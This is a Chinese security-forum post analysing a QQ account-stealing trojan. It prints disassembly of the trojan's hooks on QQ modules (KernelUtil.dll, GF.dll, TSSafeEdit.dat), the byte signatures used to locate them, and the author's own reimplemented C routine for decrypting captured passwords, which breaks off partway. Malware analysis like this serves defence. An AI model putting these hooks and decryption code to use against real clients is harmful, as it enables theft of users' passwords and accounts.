
# [7夕]分析与提取QQ木马盗号技术

程序大致的流程如下图；

![](https://bbs.kanxue.com/upload/attach/201308/591993_q5nye01k0lag2j6.jpg)

因为是用画图工具画的，所以大家就将就看下把，有什么不对的地方请多多指教；

程序是用Delphi写的，只有加载器加了个`upx`壳，其他的都没有加壳；

所以分析起来就比较简单了；

这个程序的关键技术都在`ntshruis2.dll`这个模块中了；

主要是hook了 4 个QQ进程中4个关键的地方；

## 1.

```
CODE:0040F9A5                 push    offset a?isvalidaccoun ; "?IsValidAccount@Misc@Util@@YAHVCTXStrin"...
CODE:0040F9AA                 push    offset aKernelutil\_d\_0 ; "KernelUtil.dll"
CODE:0040F9AF                 call    GetModuleHandleA\_0
CODE:0040F9B4                 push    eax             ; hModule
CODE:0040F9B5                 call    GetProcAddress\_0
CODE:0040F9BA                 push    0Fh             ; int
CODE:0040F9BC                 push    20h             ; int
CODE:0040F9BE                 push    offset unk\_413A10 ; int
CODE:0040F9C3                 push    offset sub\_40D11C ; int
CODE:0040F9C8                 push    ebx             ; nSize
CODE:0040F9C9                 push    eax             ; lpBaseAddress
CODE:0040F9CA                 call    sub\_406E28      ； hook
```

hook `KernelUtil.dll`模块中的 `"?IsValidAccount@Misc@Util@@YAHVCTXStrin"`导出函数 主要是为了获取QQ号；

## 2.

```
CODE:0040F9CF                 push    offset a?getaccountnam ; "?GetAccountName@Account@Util@@YA?AVCTXS"...
CODE:0040F9D4                 push    offset aKernelutil\_d\_0 ; "KernelUtil.dll"
CODE:0040F9D9                 call    GetModuleHandleA\_0
CODE:0040F9DE                 push    eax             ; hModule
CODE:0040F9DF                 call    GetProcAddress\_0
CODE:0040F9E4                 push    0Fh             ; int
CODE:0040F9E6                 push    20h             ; int
CODE:0040F9E8                 push    offset unk\_413A34 ; int
CODE:0040F9ED                 push    offset sub\_40F51C ; int
CODE:0040F9F2                 push    ebx             ; nSize
CODE:0040F9F3                 push    eax             ; lpBaseAddress
CODE:0040F9F4                 call    sub\_406E28
```

hook `KernelUtil.dll` 模块中的 `"?GetAccountName@Account@Util@@YA?AVCTXS"` 这个主要这个木马的后序中会给指定帐号充入Q币；

## 3.

```
CODE:0040F9F9                 push    5
CODE:0040F9FB                 push    228390h
CODE:0040FA00                 push    0
CODE:0040FA02                 mov     edx, offset unk\_4117C0
CODE:0040FA07                 mov     ecx, 21h
CODE:0040FA0C                 mov     eax, offset \_str\_GF\_DLL.Text ；GF.dll
CODE:0040FA11                 call    sub\_4069CC       //查找GF.dll中的特征码返回要hook的地址；
CODE:0040FA16                 push    0Fh             ; int
CODE:0040FA18                 push    20h             ; int
CODE:0040FA1A                 push    offset unk\_413A88 ; int
CODE:0040FA1F                 push    offset sub\_40F66C ; int
CODE:0040FA24                 push    5               ; nSize
CODE:0040FA26                 push    eax             ; lpBaseAddress
CODE:0040FA27                 call    sub\_406E28
```

hook `GF.dll` 模块中的 特征码为 `68 00 00 00 00 E8 00` 处的地址 ；

主要是为了获取用户按了什么按键 比如登录按钮；

## 4.

这个也是最关键的地方，是获取QQ密码的地方

```
CODE:0040FB08                 push    1
CODE:0040FB0A                 push    186A0h
CODE:0040FB0F                 push    0
CODE:0040FB11                 mov     edx, offset unk\_4117B8  ；特征码1：88 5D 0F 83 7E 04
CODE:0040FB16                 mov     ecx, 6
CODE:0040FB1B                 mov     eax, offset \_str\_TSSafeEdit\_dat\_0.Text
CODE:0040FB20                 call    sub\_4069CC
CODE:0040FB25                 mov     esi, eax
CODE:0040FB27                 push    0Fh             ; int
CODE:0040FB29                 push    20h             ; int
CODE:0040FB2B                 push    offset unk\_413AAC ; int
CODE:0040FB30                 push    offset sub\_40F814 ; int
CODE:0040FB35                 push    7               ; nSize
CODE:0040FB37                 push    esi             ; lpBaseAddress
CODE:0040FB38                 call    sub\_406E28
CODE:0040FB3D                 jmp     short loc\_40FB74
CODE:0040FB3F ; ---------------------------------------------------------------------------
CODE:0040FB3F
CODE:0040FB3F loc\_40FB3F:                             ; CODE XREF: sub\_40F910+1F6j
CODE:0040FB3F                 push    1
CODE:0040FB41                 push    186A0h
CODE:0040FB46                 push    0
CODE:0040FB48                 mov     edx, offset unk\_4117B0   ；特征码2：8B 5B 04 03 5D 10   （我机器上自己测试都用这段特征码 2012，2013 beat3版本的）
CODE:0040FB4D                 mov     ecx, 5
CODE:0040FB52                 mov     eax, offset \_str\_TSSafeEdit\_dat\_0.Text； TSSafeEdit.dat
CODE:0040FB57                 call    sub\_4069CC
CODE:0040FB5C                 mov     esi, eax
CODE:0040FB5E                 push    0Fh             ; int
CODE:0040FB60                 push    20h             ; int
CODE:0040FB62                 push    offset unk\_413AAC ; int
CODE:0040FB67                 push    offset sub\_40F7EC ; int
CODE:0040FB6C                 push    6               ; nSize
CODE:0040FB6E                 push    esi             ; lpBaseAddress
CODE:0040FB6F                 call    sub\_406E28     ;hook 函数
```

hook `TSSafeEdit.dat` 中特征码有 两处 ,只要hook其中的一处 就可以 具体是怎么判断要hook哪处的这个我还没看出来；

这里我们就着重分析下是获取密码的算法；

这里是hook `TSSafeEdit.dat` 中的地址之后 跳到 我们自己的函数中；

```
CODE:0040F7EC sub\_40F7EC      proc near               ; DATA XREF: sub\_40F910+257o
CODE:0040F7EC                 pusha
CODE:0040F7ED                 mov     eax, [esi+0C0h]
CODE:0040F7F3                 add     eax, 2
CODE:0040F7F6                 push    eax
CODE:0040F7F7                 push    dword ptr [ecx+48h]
CODE:0040F7FA                 push    dword ptr [ecx+40h]
CODE:0040F7FD                 push    dword ptr [ecx+8]
CODE:0040F800                 push    dword ptr [ecx+14h]
CODE:0040F803                 push    dword ptr [ecx+4]
CODE:0040F806                 call    sub\_40F6A4
CODE:0040F80B                 popa
CODE:0040F80C                 jmp     ds:off\_4117A4
CODE:0040F80C sub\_40F7EC      endp
```

翻译下

```
        __asm
        {
                pushad
                mov eax, [esi+0xC0];
                add eax, 2;
                push eax;                    //密钥key2
                push dword ptr [ecx+0x48];   //这个不清楚 0x0D 不固定的
                push dword ptr [ecx+0x40];   //密码长度
                push dword ptr [ecx+0x08];   //待解密的字符串的长度
                push dword ptr [ecx+0x14];   //猜测是密钥key1
                push dword ptr [ecx+0x04];   //待解密的字符串
                call GetPassword;
                popad
                jmp gHookPasswordJmp
        }
```

`call sub\_40F6A4` 这个函数比较长， 所以就

所以我就贴下我写好的 这段解密代码；

```
////////////////////////////////////////////////////////////////////////////////////////////

void __stdcall GetPassword(char *szBuf, char *szkey1, int nLen, int nPwdLen, int nbyte, char* szKey2)
{
        int n1;
        int n2;
        int n3;
        int n4;
        int n5;
        char szPwd[50] = {0};
        if (!bFrist)
        {
                bFrist = TRUE;
                if (nPwdLen > 0)
                {
                        n1 = 1;
                        do
                        {
                                n2 = n1 * nbyte - 1;
                                if (*(szkey1 + n2))
                                {
                                        n3 = *(szBuf + n2);
                                        if (n3 <= 0x60 || n3 >= 0x7B)
                                        {
                                                n4 = 0;
                                        }
                                        else
                                        {
                                                n3 -= 0x20;
                                                n4 = 1;
                                        }
                                        n5 = 0;
                                        while ( n3 != *(szKey2 + n5) )
                                        {
```

